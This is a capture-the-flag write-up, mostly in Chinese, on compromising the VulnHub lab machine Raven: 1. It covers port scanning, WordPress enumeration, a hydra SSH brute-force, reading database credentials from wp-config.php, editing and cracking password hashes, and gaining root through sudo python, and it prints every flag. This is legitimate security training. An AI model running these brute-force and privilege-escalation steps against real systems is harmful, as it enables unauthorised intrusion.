# Raven: 1

https://www.vulnhub.com/entry/raven-1,256/#release

difficulty: Beginner/Intermediate

Finish Date：2024-4-8

## IP

192.168.10.153

## Scan

Open Port -> 22,80,111,53879

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)
|   2048 315801194da280a6b90d40981c97aa53 (RSA)
|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)
|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45092/tcp6  status
|   100024  1          50370/udp   status
|   100024  1          51216/udp6  status
|_  100024  1          53879/tcp   status
53879/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:48:DE:62 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## flag1

访问 80 主页，点开各个链接并查看源码，看是否有信息泄露，在 http://raven.local/service.html 页面下，查看源代码，在注释中找到了第一个 flag

```
<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
```

使用目录爆破进行尝试，发现 2 个有意思的目录：

```
/vendor               (Status: 301) [Size: 317] [--> http://192.168.10.153/vendor/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.10.153/wordpress/]
```

先尝试访问 /vendor/ 目录，发现了 List Directory，查看列表中的文件，看是否有信息泄露：

-   PATH 文件中找到了 vender 的文件目录 /var/www/html/vendor/
-   VERSION 文件中找到了版本信息 5.2.16
-   发现 vendor 目录中的内容是 PHPMailer

其他没有发现什么有用的信息，尝试搜索 PHPMailer 5.2.16 对应的版本是否有可利用的漏洞，也没发现可以直接利用的，貌似这个方向行不通。

访问主页中的 BLOG 页面，显示是在一个域名下显示的：http://raven.local/wordpress/index.php/2018/08/12/hello-world/，所以需要先把 192.168.10.153 raven.local 添加到/etc/hosts 中，之后可以正常访问 BLOG 中的 wordpress 页面。

使用 wpscan 对网站进行扫描，发现有价值信息。发现两个用户名：michael 和 steven。使用 cewl -d 3 http://raven.local/wordpress/ -w pass 收集到相关密码，对 wordpress 的登陆页面进行爆破，收集的密码都不对，没有成功。

还有一个 ssh 服务，使用 hydra 对发现的两个用户名，密码字典为刚才使用 cewl 收集到的密码，进行 ssh 爆破。

```
hydra -t 20 -l michael -P ./pass ssh://192.168.10.153/
[22][ssh] host: 192.168.10.153   login: michael   password: michael
```

ssh 进行登陆 michael:michael，登陆成功时，Baner 显示了一个信息：You have new mail.。

查看/etc/passwd 发现有两个系统用户：michael 和 steven。

先尝试能不能找到 flag 文件，find 发现 flag2 文件：

```
find / -type f -name flag*.txt 2>/dev/null

/var/www/flag2.txt
```

## flag2

michael@Raven:~$ cat /var/www/flag2.txt
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

直接查看 wordpress 连接数据库的信息：

```
michael@Raven:/var/www/html/wordpress$ cat wp-config.php

define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

登陆到本地 mysql 数据库后，查看 wordpress 数据库中的用户信息表：

```
mysql> select * from wp_users;

1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
```

尝试破解两个 user 的 密码哈希，没有结果，直接 update 更改密码哈希，对应明文密码为：11111

```
UPDATE `wp_users` SET `user_pass` = '$P$BHQSV1dIWmYMxedX3AaNbZnFGlOcOW0' WHERE user_login = 'steven';
```

## flag3

用 steven:11111 登陆到 wordpress 后台后，在左侧 Posts 菜单中获得了第 3 个 flag。

```
flag3{afc01ab56b50591e7dccf93122770cd2}
```

## flag4

### 方式 1：

看到了 flag 是在 Post 中，进入数据库再次检索 wp_posts 表，看是否有新的发现，果然发现了 flag4

```
flag4{715dea6c055b9fe3337544932f2941ce}
```

### 方式 2：

尝试对系统进行提权到 root，上传 linpeas.sh，未发现有用的信心，检测系统内核漏洞，尝试了几个都没有成功。前面发现的两个用户只有一个登陆成功了，尝试对数据库中的另外一个哈希 `$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/` 进行破解，尝试获得明文密码。

```
john --wordlist=/home/kali/tools/dict/rockyou.txt hash

pink84           (?)
```

获得了明文密码 pink84，尝试对 steven ssh 登陆，发现登陆成功。看此用户是否有能提权的功能点：

```
$ sudo -l
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

使用 python 进行提权利用，获得 root 权限：

```
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
```

在/root 下发现 flag4.txt

```
# cat flag4.txt
______

| ___ \

| |_/ /__ ___   _____ _ __

|    // _` \ \ / / _ \ '_ \

| |\ \ (_| |\ V /  __/ | | |

\_| \_\__,_| \_/ \___|_| |_|


flag4{715dea6c055b9fe3337544932f2941ce}
```
